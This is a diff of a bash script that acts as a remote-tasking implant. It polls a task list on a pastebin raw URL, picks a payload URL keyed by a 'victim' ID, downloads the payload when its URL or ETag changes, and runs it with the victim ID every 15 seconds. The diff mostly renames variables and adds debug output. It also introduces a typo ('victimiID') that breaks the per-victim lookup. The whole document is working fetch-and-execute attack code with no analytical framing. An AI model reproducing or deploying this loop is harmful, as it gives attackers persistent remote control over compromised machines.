@@ -13,29 +13,32 @@ fi
 taskURL="https://pastebin.com/raw/PPUdAf1s"
 
 localTaskData="$SCRIPTDIR/taskdata"
-localPayloadLoc="$SCRIPTDIR/payload"
-localPayloadETag="$SCRIPTDIR/payload.etag"
-localPayloadURL="$SCRIPTDIR/payload.url"
+localPayloadFile="$SCRIPTDIR/payload"
+localPayloadETagFile="$SCRIPTDIR/payload.etag"
+localPayloadURLFile="$SCRIPTDIR/payload.url"
 
 ###################################################################
 
 # Remove the payload and local values
 
-rm -rf "$localPayloadLoc" "$localPayloadETag" "$localPayloadURL"
-touch "$localPayloadLoc"
-touch "$localPayloadETag"
-touch "$localPayloadURL"
+rm -rf "$localPayloadFile" "$localPayloadETagFile" "$localPayloadURLFile"
+touch "$localPayloadFile"
+touch "$localPayloadETagFile"
+touch "$localPayloadURLFile"
 
 ###################################################################
 
 function getURLETag(){
-  local url="$1"
-  curl -s -I "$url" \
+  #echo "getURLETag: $1" >&2
+  local remoteURL="$1"
+
+  curl -s -H 'Cache-Control: no-cache' -I "$remoteURL" \
    | grep '^ETag' \
    | cut -d'"' -f2
 }
 
 function getTaskURL(){
+  #echo "getTaskURL: $1" >&2
   local victimID="$1"
 
   cat "$localTaskData" \
@@ -46,10 +49,14 @@ function getTaskURL(){
 }
 
 function getPayloadURL(){
+  #echo "getPayloadURL: $1" >&2
   local url="$1"
+  local victimID="$2"
   
-  curl -H 'Cache-Control: no-cache' -s "$url" > "$localTaskData"
-  local payloadURL=`getTaskURL "$victim"`
+  curl -H 'Cache-Control: no-cache' -s "$url" \
+   | tr -d '\015' \
+   > "$localTaskData"
+  local payloadURL=`getTaskURL "$victimiID"`
   if [ -z "$payloadURL" ]; then
     payloadURL=`getTaskURL "default"`
   fi
@@ -58,6 +65,7 @@ function getPayloadURL(){
 }
 
 function downloadURL(){
+  #echo "downloadURL: $1, $2"
   local url="$1"
   local outfile="$2"
   echo "downloadURL: Downloading $url"
@@ -67,36 +75,38 @@ function downloadURL(){
 
 function downloadPayloadIfNeeded(){
 
-  local remoteURL=`getPayloadURL "$taskURL"`
+  local remoteURL=`getPayloadURL "$taskURL" "$victim"`
   local remoteURLETag=`getURLETag "$remoteURL"`
+  localURL=`head -n1 "$localPayloadURLFile"`
+  localETag=`head -n1 "$localPayloadETagFile"`
 
-  localURL=`head -n1 "$localPayloadURL"`
-  localETag=`head -n1 "$localPayloadETag"`
-
-  echo "downloadPayloadIfNeeded: $localURL -> $remoteURL"
-  echo "downloadPayloadIfNeeded: $localETag -> $remoteURLETag"
+  echo "downloadPayloadIfNeeded: l-> $localURL"
+  echo "downloadPayloadIfNeeded: r-> $remoteURL"
+  echo "downloadPayloadIfNeeded: l-> $localETag"
+  echo "downloadPayloadIfNeeded: r-> $remoteURLETag"
 
     # We have a totally new URL, we should get it no matter what!
   if [ "$remoteURL" != "$localURL" ]; then
     echo "downloadPayloadIfNeeded: We have a new URL!"
-    downloadURL "$remoteURL" "$localPayloadLoc"
-    echo "$remoteURL" > "$localPayloadURL"
-    echo "$remoteURLETag" > "$localPayloadETag"
+    downloadURL "$remoteURL" "$localPayloadFile"
+    echo "$remoteURL" > "$localPayloadURLFile"
+    echo "$remoteURLETag" > "$localPayloadETagFile"
 
   else
     echo "downloadPayloadIfNeeded: Same URL"
 
     if [ "$localETag" != "$remoteURLETag" ]; then
       echo "downloadPayloadIfNeeded: The payload has been updated!"
-      downloadURL "$remoteURL" "$localPayloadLoc"
-      echo "$remoteURLETag" > "$localPayloadETag"
+      downloadURL "$remoteURL" "$localPayloadFile"
+      echo "$remoteURLETag" > "$localPayloadETagFile"
     fi
   fi
 
 }
 
 function runPayload() {
-  "$localPayloadLoc" "$victim" &> /dev/null
+  echo "runPayload: Running"
+  "$localPayloadFile" "$victim" "$iteration"
 }
 
 ###################################################################
@@ -120,6 +130,6 @@ while [ true ]; do
 
   sleep 15
 
-  let iteration=$((iteration+1)
+  let iteration=$((iteration+1))
 
 done
